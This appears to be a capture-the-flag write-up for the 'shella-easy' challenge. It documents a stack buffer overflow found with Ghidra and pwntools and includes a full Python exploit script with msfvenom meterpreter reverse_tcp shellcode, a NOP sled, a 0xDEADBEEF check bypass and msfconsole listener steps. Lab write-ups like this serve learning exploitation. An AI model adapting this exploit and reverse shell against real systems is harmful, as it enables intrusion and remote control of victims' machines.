# This is the documentation for the shella ctf challenge

## Step-by-Step Guide

This document outlines the steps taken to identify and exploit a buffer overflow vulnerability
using tools like Ghidra, virtual environment, and Python. Each step is critical to
understanding the target system, identifying the vulnerability, executing a shellcode, and
creating a succesful exploit.


### File information:

shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked,
interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped



### Security information

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      SymbolsFORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   71 Symbols       No    0               2               shella-easy                                    
                                                                                               

### 3. Identifying the Target Memory Address

**Description:**
Finding the memory address you want to return to after exploiting the buffer overflow is
critical for hijacking. In this case the memory address we want was within the sentence
displayed when the shella-easy program is run.

* **Analyze the Binary:** Using Ghidra to identify the memory address you want to redirect
execution to. Ghidra is also good for knowing how far you are from a desire address and how
much you need to pad it to reach there.

* **Record the Address:** This address will be used later in the payload to overwrite the
return address. We record multiple address in this challenge because we have to bypass certain
obstacles to get to where we wanted. For example in Ghidra we found a conditional statment that
needed the memory address of deadbeef in order for the program to not just exit.


#4. The use of padding and shellcode

**What is cyclic: **
In our explotation code we use a function called cyclic which is a built in function of the
pwntools library. This function is supposed to create a unique pattern of characters in which
we shoud be able to find after inputting it in a function. Using the other built in function
cyclic_find() in which you insert a memory address of where the unique pattern is in memory
and show the distance in which how far away you are. These two tools was helpful in indentifying
how much we needed to pad the code.


**msfvenom: ** 
We used Metasploit framework to generate a better shellcode to implement in our payload.
Since the payload was larger than the previous one we used, we integrated nop slides in order
to help us reach it in memory after overriding the return address. 


**msfconsole :**
We also utilized msfconsole a listener to listen when the shellcode is executed and connect to
the port and the local host specified in the shellcode generated from the metasploit framework.
The steps to start up the console was to call msfconsole, use linux/x86/meterpreter/reverse_tcp
(the payload), set LPORT 4444, set LHOST 127.0.0.1, exploit. This than connectes to the shellcode
that has been executed. 
 


#5. The exploit code

```python
 from pwn import * 

 # initalizing the process
 pw = process("./shella-easy")

 # Recieve data until the > symbol
 pw.recvuntil(b'have a')

 the_memory = pw.recv(12)

 # sends data to buffer overflow while also sending the address we want
 print(the_memory)

 payload = b''

 # This shellcode is from: msfvenom payload list
 
 buf =  b""
 buf += b"\xbe\x05\x55\x5d\x4a\xdb\xdc\xd9\x74\x24\xf4\x5d"
 buf += b"\x2b\xc9\xb1\x1f\x31\x75\x15\x83\xed\xfc\x03\x75"
 buf += b"\x11\xe2\xf0\x3f\x57\x14\xcb\x64\x90\x4b\x78\xd8"
 buf += b"\x0c\xe6\x7c\x6e\xd4\x7f\x61\x43\x99\x17\x3a\x34"
 buf += b"\xe5\x17\xbc\xc5\x71\x1a\xbc\xd4\xdd\x93\x5d\xbc"
 buf += b"\xbb\xfb\xcd\x10\x13\x75\x0c\xd1\x56\x05\x4b\x16"
 buf += b"\x11\x1f\x1d\xe3\xdf\x77\x03\x0b\x20\x88\x1b\x66"
 buf += b"\x20\xe2\x9e\xff\xc3\xc3\x69\x32\x83\xa1\xa9\xb4"
 buf += b"\x39\x42\x0e\xf5\x45\x2c\x50\xe9\x49\x4e\xd9\xea"
 buf += b"\x8b\xa5\xd5\x2d\xe8\x36\x55\xd0\x22\xc6\x10\xeb"
 buf += b"\xc5\xd7\x41\x65\xd4\x41\xc7\x1f\xa7\x71\xea\x60"
 buf += b"\x42\xb5\x8c\x62\xb2\xd7\xd4\x62\x4c\x18\x24\xde"
 buf += b"\x4d\x18\x24\x20\x83\x98"


 #gdb.attach(pw, gdbscript = 'b *0x8048548')


 # This is to make sure the shellcode lines up with our deadbeef 
 payload += b'A' * 64

 # The memory address of deadbeef needed to bypass the conditional statement
 payload += p32(0xDEADBEEF)

 # This is to line up the return address
 payload += b'B' * 8


 # The return address where are shellcode is in memory
 payload += p32(int(the_memory,16) + 88)

 payload += b'\x90' * 8

 payload += buf

 # Sends the payload
 pw.sendline(payload)

 print(pw.recvline())

 # allows us to interact with the process
 pw.interactive()
 

```


### Conclusion

When going through these steps you realize it is important to know what your objective is
and taking each progress step by step. In order for one block of code to execute it relies on
the execution of another block of code or condition that was cleared earlier. Knowing the
convertions of hexadecimle and binary was important and padding was critical in this challenge.
It's like a puzzle in which you need to find all your pieces in order to create a succesful 
exploitation.
 

